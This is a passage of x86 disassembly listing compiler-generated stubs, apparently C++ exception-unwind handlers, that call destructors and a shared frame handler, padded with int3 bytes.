  404fff:	cc                   	int3
  405000:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  405003:	e9 fc f5 ff ff       	jmp    0x404604
  405008:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40500b:	e9 f4 f5 ff ff       	jmp    0x404604
  405010:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  405013:	e9 ec f5 ff ff       	jmp    0x404604
  405018:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40501b:	e9 e4 f5 ff ff       	jmp    0x404604
  405020:	b8 30 77 40 00       	mov    $0x407730,%eax
  405025:	e9 f6 f7 ff ff       	jmp    0x404820
  40502a:	cc                   	int3
  40502b:	cc                   	int3
  40502c:	cc                   	int3
  40502d:	cc                   	int3
  40502e:	cc                   	int3
  40502f:	cc                   	int3
  405030:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405033:	e9 d2 f5 ff ff       	jmp    0x40460a
  405038:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40503b:	83 c1 60             	add    $0x60,%ecx
  40503e:	e9 51 f6 ff ff       	jmp    0x404694
  405043:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405046:	81 c1 a0 00 00 00    	add    $0xa0,%ecx
  40504c:	e9 b3 f5 ff ff       	jmp    0x404604
  405051:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405054:	81 c1 a4 00 00 00    	add    $0xa4,%ecx
  40505a:	e9 a5 f5 ff ff       	jmp    0x404604
  40505f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405062:	81 c1 a8 00 00 00    	add    $0xa8,%ecx
  405068:	e9 97 f5 ff ff       	jmp    0x404604
  40506d:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405070:	81 c1 ac 00 00 00    	add    $0xac,%ecx
  405076:	e9 89 f5 ff ff       	jmp    0x404604
  40507b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40507e:	81 c1 b0 00 00 00    	add    $0xb0,%ecx
  405084:	e9 7b f5 ff ff       	jmp    0x404604
  405089:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40508c:	81 c1 b4 00 00 00    	add    $0xb4,%ecx
  405092:	e9 6d f5 ff ff       	jmp    0x404604
  405097:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40509a:	81 c1 bc 00 00 00    	add    $0xbc,%ecx
  4050a0:	e9 9b c7 ff ff       	jmp    0x401840
  4050a5:	b8 70 77 40 00       	mov    $0x407770,%eax
  4050aa:	e9 71 f7 ff ff       	jmp    0x404820
  4050af:	cc                   	int3
  4050b0:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4050b3:	e9 52 f5 ff ff       	jmp    0x40460a
  4050b8:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4050bb:	83 c1 60             	add    $0x60,%ecx
  4050be:	e9 d1 f5 ff ff       	jmp    0x404694
  4050c3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4050c6:	81 c1 a0 00 00 00    	add    $0xa0,%ecx
  4050cc:	e9 33 f5 ff ff       	jmp    0x404604
  4050d1:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4050d4:	81 c1 a4 00 00 00    	add    $0xa4,%ecx
  4050da:	e9 25 f5 ff ff       	jmp    0x404604
  4050df:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4050e2:	81 c1 a8 00 00 00    	add    $0xa8,%ecx
  4050e8:	e9 17 f5 ff ff       	jmp    0x404604
  4050ed:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4050f0:	81 c1 ac 00 00 00    	add    $0xac,%ecx
  4050f6:	e9 09 f5 ff ff       	jmp    0x404604
  4050fb:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4050fe:	81 c1 b0 00 00 00    	add    $0xb0,%ecx
  405104:	e9 fb f4 ff ff       	jmp    0x404604
  405109:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40510c:	81 c1 b4 00 00 00    	add    $0xb4,%ecx
  405112:	e9 ed f4 ff ff       	jmp    0x404604
  405117:	b8 d8 77 40 00       	mov    $0x4077d8,%eax
  40511c:	e9 ff f6 ff ff       	jmp    0x404820
  405121:	cc                   	int3
  405122:	cc                   	int3
  405123:	cc                   	int3
  405124:	cc                   	int3
  405125:	cc                   	int3
  405126:	cc                   	int3
  405127:	cc                   	int3
  405128:	cc                   	int3
  405129:	cc                   	int3
  40512a:	cc                   	int3
  40512b:	cc                   	int3
  40512c:	cc                   	int3
  40512d:	cc                   	int3
  40512e:	cc                   	int3
  40512f:	cc                   	int3
  405130:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  405133:	e9 cc f4 ff ff       	jmp    0x404604
  405138:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40513b:	e9 c4 f4 ff ff       	jmp    0x404604
  405140:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  405143:	e9 bc f4 ff ff       	jmp    0x404604
  405148:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40514b:	e9 b4 f4 ff ff       	jmp    0x404604
  405150:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  405153:	e9 ac f4 ff ff       	jmp    0x404604
  405158:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40515b:	e9 a4 f4 ff ff       	jmp    0x404604
  405160:	b8 38 78 40 00       	mov    $0x407838,%eax
  405165:	e9 b6 f6 ff ff       	jmp    0x404820
  40516a:	cc                   	int3
  40516b:	cc                   	int3
  40516c:	cc                   	int3
  40516d:	cc                   	int3
  40516e:	cc                   	int3
  40516f:	cc                   	int3
  405170:	8d 4d 88             	lea    -0x78(%ebp),%ecx
  405173:	e9 d8 df ff ff       	jmp    0x403150
  405178:	b8 88 78 40 00       	mov    $0x407888,%eax
  40517d:	e9 9e f6 ff ff       	jmp    0x404820
  405182:	cc                   	int3
  405183:	cc                   	int3
  405184:	cc                   	int3
  405185:	cc                   	int3
  405186:	cc                   	int3
  405187:	cc                   	int3
  405188:	cc                   	int3
  405189:	cc                   	int3
  40518a:	cc                   	int3
  40518b:	cc                   	int3
  40518c:	cc                   	int3
  40518d:	cc                   	int3
  40518e:	cc                   	int3
  40518f:	cc                   	int3
  405190:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405193:	e9 72 f4 ff ff       	jmp    0x40460a
  405198:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40519b:	83 c1 68             	add    $0x68,%ecx
  40519e:	e9 9d c6 ff ff       	jmp    0x401840
  4051a3:	b8 b0 78 40 00       	mov    $0x4078b0,%eax
  4051a8:	e9 73 f6 ff ff       	jmp    0x404820
  4051ad:	cc                   	int3
  4051ae:	cc                   	int3
  4051af:	cc                   	int3
  4051b0:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4051b3:	e9 52 f4 ff ff       	jmp    0x40460a
  4051b8:	b8 e0 78 40 00       	mov    $0x4078e0,%eax
  4051bd:	e9 5e f6 ff ff       	jmp    0x404820
  4051c2:	cc                   	int3
  4051c3:	cc                   	int3
  4051c4:	cc                   	int3
  4051c5:	cc                   	int3
  4051c6:	cc                   	int3
  4051c7:	cc                   	int3
  4051c8:	cc                   	int3
  4051c9:	cc                   	int3
  4051ca:	cc                   	int3
  4051cb:	cc                   	int3
  4051cc:	cc                   	int3
  4051cd:	cc                   	int3
  4051ce:	cc                   	int3
  4051cf:	cc                   	int3
  4051d0:	b8 40 79 40 00       	mov    $0x407940,%eax
  4051d5:	e9 46 f6 ff ff       	jmp    0x404820
  4051da:	cc                   	int3
  4051db:	cc                   	int3
  4051dc:	cc                   	int3
  4051dd:	cc                   	int3
  4051de:	cc                   	int3
  4051df:	cc                   	int3
  4051e0:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  4051e3:	e9 d8 f5 ff ff       	jmp    0x4047c0
  4051e8:	b8 98 79 40 00       	mov    $0x407998,%eax
  4051ed:	e9 2e f6 ff ff       	jmp    0x404820
  4051f2:	cc                   	int3
  4051f3:	cc                   	int3
  4051f4:	cc                   	int3
  4051f5:	cc                   	int3
  4051f6:	cc                   	int3
  4051f7:	cc                   	int3
  4051f8:	cc                   	int3
  4051f9:	cc                   	int3
  4051fa:	cc                   	int3
  4051fb:	cc                   	int3
  4051fc:	cc                   	int3
  4051fd:	cc                   	int3
  4051fe:	cc                   	int3
  4051ff:	cc                   	int3
  405200:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  405203:	e9 fc f3 ff ff       	jmp    0x404604
  405208:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40520b:	e9 f4 f3 ff ff       	jmp    0x404604
  405210:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  405213:	e9 ec f3 ff ff       	jmp    0x404604
  405218:	b8 c0 79 40 00       	mov    $0x4079c0,%eax
  40521d:	e9 fe f5 ff ff       	jmp    0x404820
  405222:	cc                   	int3
  405223:	cc                   	int3
  405224:	cc                   	int3
  405225:	cc                   	int3
  405226:	cc                   	int3
  405227:	cc                   	int3
  405228:	cc                   	int3
  405229:	cc                   	int3
  40522a:	cc                   	int3
  40522b:	cc                   	int3
  40522c:	cc                   	int3
  40522d:	cc                   	int3
  40522e:	cc                   	int3
  40522f:	cc                   	int3
  405230:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  405233:	e9 cc f3 ff ff       	jmp    0x404604
  405238:	b8 f8 79 40 00       	mov    $0x4079f8,%eax
  40523d:	e9 de f5 ff ff       	jmp    0x404820
  405242:	cc                   	int3
  405243:	cc                   	int3
  405244:	cc                   	int3
  405245:	cc                   	int3
  405246:	cc                   	int3
  405247:	cc                   	int3
  405248:	cc                   	int3
  405249:	cc                   	int3
  40524a:	cc                   	int3
  40524b:	cc                   	int3
  40524c:	cc                   	int3
  40524d:	cc                   	int3
  40524e:	cc                   	int3
  40524f:	cc                   	int3
  405250:	8d 4d 94             	lea    -0x6c(%ebp),%ecx
  405253:	e9 18 de ff ff       	jmp    0x403070
  405258:	b8 20 7a 40 00       	mov    $0x407a20,%eax
  40525d:	e9 be f5 ff ff       	jmp    0x404820
  405262:	cc                   	int3
  405263:	cc                   	int3
  405264:	cc                   	int3
  405265:	cc                   	int3
  405266:	cc                   	int3
  405267:	cc                   	int3
  405268:	cc                   	int3
  405269:	cc                   	int3
  40526a:	cc                   	int3
  40526b:	cc                   	int3
  40526c:	cc                   	int3
  40526d:	cc                   	int3
  40526e:	cc                   	int3
  40526f:	cc                   	int3
  405270:	8d 4d 94             	lea    -0x6c(%ebp),%ecx
  405273:	e9 f8 dd ff ff       	jmp    0x403070
  405278:	b8 48 7a 40 00       	mov    $0x407a48,%eax
  40527d:	e9 9e f5 ff ff       	jmp    0x404820
  405282:	cc                   	int3
  405283:	cc                   	int3
  405284:	cc                   	int3
  405285:	cc                   	int3
  405286:	cc                   	int3
  405287:	cc                   	int3
  405288:	cc                   	int3
  405289:	cc                   	int3
  40528a:	cc                   	int3
  40528b:	cc                   	int3
  40528c:	cc                   	int3
  40528d:	cc                   	int3
  40528e:	cc                   	int3
  40528f:	cc                   	int3
  405290:	8d 8d 3c ff ff ff    	lea    -0xc4(%ebp),%ecx
  405296:	e9 d5 d1 ff ff       	jmp    0x402470
  40529b:	8d 8d 3c ff ff ff    	lea    -0xc4(%ebp),%ecx
  4052a1:	e9 64 f3 ff ff       	jmp    0x40460a
  4052a6:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  4052a9:	e9 e6 f3 ff ff       	jmp    0x404694
  4052ae:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4052b1:	e9 4e f3 ff ff       	jmp    0x404604
  4052b6:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  4052b9:	e9 46 f3 ff ff       	jmp    0x404604
  4052be:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  4052c1:	e9 3e f3 ff ff       	jmp    0x404604
  4052c6:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4052c9:	e9 36 f3 ff ff       	jmp    0x404604
  4052ce:	b8 70 7a 40 00       	mov    $0x407a70,%eax
  4052d3:	e9 48 f5 ff ff       	jmp    0x404820
  4052d8:	cc                   	int3
  4052d9:	cc                   	int3
  4052da:	cc                   	int3
  4052db:	cc                   	int3
  4052dc:	cc                   	int3
  4052dd:	cc                   	int3
  4052de:	cc                   	int3
  4052df:	cc                   	int3
  4052e0:	8d 4d 04             	lea    0x4(%ebp),%ecx
  4052e3:	e9 58 c5 ff ff       	jmp    0x401840
  4052e8:	b8 c8 7a 40 00       	mov    $0x407ac8,%eax
  4052ed:	e9 2e f5 ff ff       	jmp    0x404820
  4052f2:	cc                   	int3
  4052f3:	cc                   	int3
  4052f4:	cc                   	int3
  4052f5:	cc                   	int3
  4052f6:	cc                   	int3
  4052f7:	cc                   	int3
  4052f8:	cc                   	int3
  4052f9:	cc                   	int3
  4052fa:	cc                   	int3
  4052fb:	cc                   	int3
  4052fc:	cc                   	int3
  4052fd:	cc                   	int3
  4052fe:	cc                   	int3
  4052ff:	cc                   	int3
  405300:	8d 8d 34 ff ff ff    	lea    -0xcc(%ebp),%ecx
  405306:	e9 45 d8 ff ff       	jmp    0x402b50
  40530b:	8d 8d 34 ff ff ff    	lea    -0xcc(%ebp),%ecx
  405311:	e9 f4 f2 ff ff       	jmp    0x40460a
  405316:	8d 4d 94             	lea    -0x6c(%ebp),%ecx
  405319:	e9 76 f3 ff ff       	jmp    0x404694
  40531e:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  405321:	e9 de f2 ff ff       	jmp    0x404604
  405326:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405329:	e9 d6 f2 ff ff       	jmp    0x404604
  40532e:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405331:	e9 ce f2 ff ff       	jmp    0x404604
  405336:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  405339:	e9 c6 f2 ff ff       	jmp    0x404604
  40533e:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  405341:	e9 be f2 ff ff       	jmp    0x404604
  405346:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  405349:	e9 b6 f2 ff ff       	jmp    0x404604
  40534e:	b8 f0 7a 40 00       	mov    $0x407af0,%eax
  405353:	e9 c8 f4 ff ff       	jmp    0x404820
  405358:	cc                   	int3
  405359:	cc                   	int3
  40535a:	cc                   	int3
  40535b:	cc                   	int3
  40535c:	cc                   	int3
  40535d:	cc                   	int3
  40535e:	cc                   	int3
  40535f:	cc                   	int3
  405360:	8d 4d 04             	lea    0x4(%ebp),%ecx
  405363:	e9 d8 c4 ff ff       	jmp    0x401840
  405368:	b8 58 7b 40 00       	mov    $0x407b58,%eax
  40536d:	e9 ae f4 ff ff       	jmp    0x404820
  405372:	cc                   	int3
  405373:	cc                   	int3
  405374:	cc                   	int3
  405375:	cc                   	int3
  405376:	cc                   	int3
  405377:	cc                   	int3
  405378:	cc                   	int3
  405379:	cc                   	int3
  40537a:	cc                   	int3
  40537b:	cc                   	int3
  40537c:	cc                   	int3
  40537d:	cc                   	int3
  40537e:	cc                   	int3
  40537f:	cc                   	int3
  405380:	8d 8d 00 ff ff ff    	lea    -0x100(%ebp),%ecx
  405386:	e9 35 c0 ff ff       	jmp    0x4013c0
  40538b:	8d 8d 00 ff ff ff    	lea    -0x100(%ebp),%ecx
  405391:	e9 74 f2 ff ff       	jmp    0x40460a
  405396:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  40539c:	e9 f9 f2 ff ff       	jmp    0x40469a
  4053a1:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  4053a4:	e9 eb f2 ff ff       	jmp    0x404694
  4053a9:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  4053ac:	e9 53 f2 ff ff       	jmp    0x404604
  4053b1:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4053b4:	e9 4b f2 ff ff       	jmp    0x404604
  4053b9:	b8 80 7b 40 00       	mov    $0x407b80,%eax
  4053be:	e9 5d f4 ff ff       	jmp    0x404820
  4053c3:	cc                   	int3
  4053c4:	cc                   	int3
  4053c5:	cc                   	int3
  4053c6:	cc                   	int3
  4053c7:	cc                   	int3
  4053c8:	cc                   	int3
  4053c9:	cc                   	int3
  4053ca:	cc                   	int3
  4053cb:	cc                   	int3
  4053cc:	cc                   	int3
  4053cd:	cc                   	int3
  4053ce:	cc                   	int3
  4053cf:	cc                   	int3
  4053d0:	8d 4d 04             	lea    0x4(%ebp),%ecx
  4053d3:	e9 68 c4 ff ff       	jmp    0x401840
  4053d8:	b8 d0 7b 40 00       	mov    $0x407bd0,%eax
  4053dd:	e9 3e f4 ff ff       	jmp    0x404820
  4053e2:	cc                   	int3
  4053e3:	cc                   	int3
  4053e4:	cc                   	int3
  4053e5:	cc                   	int3
  4053e6:	cc                   	int3
  4053e7:	cc                   	int3
  4053e8:	cc                   	int3
  4053e9:	cc                   	int3
  4053ea:	cc                   	int3
  4053eb:	cc                   	int3
  4053ec:	cc                   	int3
  4053ed:	cc                   	int3
  4053ee:	cc                   	int3
  4053ef:	cc                   	int3
  4053f0:	8d 8d 34 ff ff ff    	lea    -0xcc(%ebp),%ecx
  4053f6:	e9 05 d3 ff ff       	jmp    0x402700
  4053fb:	8d 8d 34 ff ff ff    	lea    -0xcc(%ebp),%ecx
  405401:	e9 04 f2 ff ff       	jmp    0x40460a
  405406:	8d 4d 94             	lea    -0x6c(%ebp),%ecx
  405409:	e9 86 f2 ff ff       	jmp    0x404694
  40540e:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405411:	e9 ee f1 ff ff       	jmp    0x404604
  405416:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405419:	e9 e6 f1 ff ff       	jmp    0x404604
  40541e:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  405421:	e9 de f1 ff ff       	jmp    0x404604
  405426:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  405429:	e9 d6 f1 ff ff       	jmp    0x404604
  40542e:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  405431:	e9 ce f1 ff ff       	jmp    0x404604
  405436:	b8 f8 7b 40 00       	mov    $0x407bf8,%eax
  40543b:	e9 e0 f3 ff ff       	jmp    0x404820
  405440:	8d 4d 04             	lea    0x4(%ebp),%ecx
  405443:	e9 f8 c3 ff ff       	jmp    0x401840
  405448:	b8 58 7c 40 00       	mov    $0x407c58,%eax
  40544d:	e9 ce f3 ff ff       	jmp    0x404820
  405452:	cc                   	int3
  405453:	cc                   	int3
  405454:	cc                   	int3
  405455:	cc                   	int3
  405456:	cc                   	int3
  405457:	cc                   	int3
  405458:	cc                   	int3
  405459:	cc                   	int3
  40545a:	cc                   	int3
  40545b:	cc                   	int3
  40545c:	cc                   	int3
  40545d:	cc                   	int3
  40545e:	cc                   	int3
  40545f:	cc                   	int3
  405460:	8d 8d d0 fe ff ff    	lea    -0x130(%ebp),%ecx
  405466:	e9 35 bc ff ff       	jmp    0x4010a0
  40546b:	8d 8d 38 ff ff ff    	lea    -0xc8(%ebp),%ecx
  405471:	e9 ca cb ff ff       	jmp    0x402040
  405476:	8d 8d 38 ff ff ff    	lea    -0xc8(%ebp),%ecx
  40547c:	e9 89 f1 ff ff       	jmp    0x40460a
  405481:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  405484:	e9 0b f2 ff ff       	jmp    0x404694
  405489:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40548c:	e9 73 f1 ff ff       	jmp    0x404604
  405491:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  405494:	e9 a7 c3 ff ff       	jmp    0x401840
  405499:	8d 8d d0 fe ff ff    	lea    -0x130(%ebp),%ecx
  40549f:	e9 66 f1 ff ff       	jmp    0x40460a
  4054a4:	b8 80 7c 40 00       	mov    $0x407c80,%eax
  4054a9:	e9 72 f3 ff ff       	jmp    0x404820
  4054ae:	cc                   	int3
  4054af:	cc                   	int3
  4054b0:	8d 4d 04             	lea    0x4(%ebp),%ecx
  4054b3:	e9 88 c3 ff ff       	jmp    0x401840
  4054b8:	b8 d8 7c 40 00       	mov    $0x407cd8,%eax
  4054bd:	e9 5e f3 ff ff       	jmp    0x404820
  4054c2:	cc                   	int3
  4054c3:	cc                   	int3
  4054c4:	cc                   	int3
  4054c5:	cc                   	int3
  4054c6:	cc                   	int3
  4054c7:	cc                   	int3
  4054c8:	cc                   	int3
  4054c9:	cc                   	int3
  4054ca:	cc                   	int3
  4054cb:	cc                   	int3
  4054cc:	cc                   	int3
  4054cd:	cc                   	int3
  4054ce:	cc                   	int3
  4054cf:	cc                   	int3
  4054d0:	8d 4d 94             	lea    -0x6c(%ebp),%ecx
  4054d3:	e9 98 db ff ff       	jmp    0x403070
  4054d8:	b8 00 7d 40 00       	mov    $0x407d00,%eax
  4054dd:	e9 3e f3 ff ff       	jmp    0x404820
